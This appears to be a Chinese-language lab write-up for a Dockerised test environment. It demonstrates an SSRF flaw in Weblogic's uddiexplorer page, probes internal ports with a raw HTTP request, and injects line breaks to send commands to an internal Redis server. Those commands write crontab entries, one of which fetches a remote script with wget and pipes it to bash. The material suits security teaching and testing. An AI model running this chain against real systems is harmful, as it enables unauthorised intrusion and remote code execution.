# Weblogic SSRF漏洞

Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。

## 测试环境搭建

编译及启动测试环境

```
docker-compose build
docker-compose up -d
```

访问`http://your-ip:7001/uddiexplorer/`，无需登录即可查看uddiexplorer应用。

## SSRF漏洞测试

SSRF漏洞存在于`http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp`，我们在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如`http://127.0.0.1:80`：

```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001 HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close


```

可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回`did not have a valid SOAP content-type`。

![](1.png)

修改为一个不存在的端口，将会返回`could not connect over HTTP to server`。

![](2.png)

通过错误的不同，即可探测内网状态。

## 注入HTTP头，利用Redis反弹shell

Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入`%0a%0d`来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。

首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现`172.18.0.2:6389`可以连通：

![](3.png)

发送三条redis命令，将弹shell脚本写入`/etc/crontab`：

```
set 1 "\n\n\n\n* * * * * root /usr/bin/wget -qO- https://git.io/v9djj|bash\n\n\n\n"

set 1 "\n\n\n\n* * * * * root touch /tmp/success\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save

set 1 "\n\n\n\n* * * * * touch /tmp/success\n\n\n\n"
config set dir /var/spool/cron/
config set dbfilename root
save
```

